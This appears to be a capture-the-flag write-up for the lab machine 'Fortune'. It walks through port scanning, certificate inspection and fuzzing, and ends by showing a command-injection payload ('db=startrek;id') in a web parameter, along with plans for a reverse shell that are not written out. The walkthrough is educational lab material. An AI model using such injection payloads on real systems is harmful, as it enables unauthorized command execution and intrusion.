# Fortune

This is the write-up for the box Fortune that got retired at the 3rd August 2019.

Let's put this in our hosts file:
```markdown
10.10.10.127    fortune.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/fortune.nmap 10.10.10.127
```

We get following results:
```markdown
PORT    STATE SERVICE    VERSION
22/tcp  open  ssh        OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 07:ca:21:f4:e0:d2:c6:9e:a8:f7:61:df:d7:ef:b1:f4 (RSA)
|   256 30:4b:25:47:17:84:af:60:e2:80:20:9d:fd:86:88:46 (ECDSA)
|_  256 93:56:4a:ee:87:9d:f6:5b:f9:d9:25:a6:d8:e0:08:7e (ED25519)
80/tcp  open  http       OpenBSD httpd
|_http-server-header: OpenBSD httpd
|_http-title: Fortune
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time
```

### Checking HTTPS (443)

Checking the certificate:
```markdown
openssl s_client -connect 10.10.10.127:443
```

We get potential users named _charlie_ and _bob_

### Checking HTTP (Port 80)

This is a page that gets you different fortunes whenever you reload it, so there must be some server-side things that happen.
Send it to Burpsuite and try some characters in the _db_ parameter, to see how the page reacts.
As special characters let it error out, we try some fuzzing with **WFUZZ**.

```markdown
wfuzz --hh 293 -w /usr/share/seclists/Fuzzing/special-chars.txt -d db=startrekFUZZ http://10.10.10.127/select
```

This gets us the following characters: &, +, \, ;
The _ampersand_ and the _plus_ are uninteresting for us and the _backslash_ is for escaping characters.
So the only thing that is interesting is the _semicolon_.

If we put a command as after the value in the parameter _db_ like this:

```markdown
db=startrek;id
```

Then the command gets executed. This means we try to get a reverse shell with **Netcat**.
Netcat is installed on the machine but doesn't work. There is probably a firewall in the way because pinging works.
We are writing our own script to get a reverse shell, that is in this folder named **cmd-inject.py**

```markdown
db=startrek;id
```
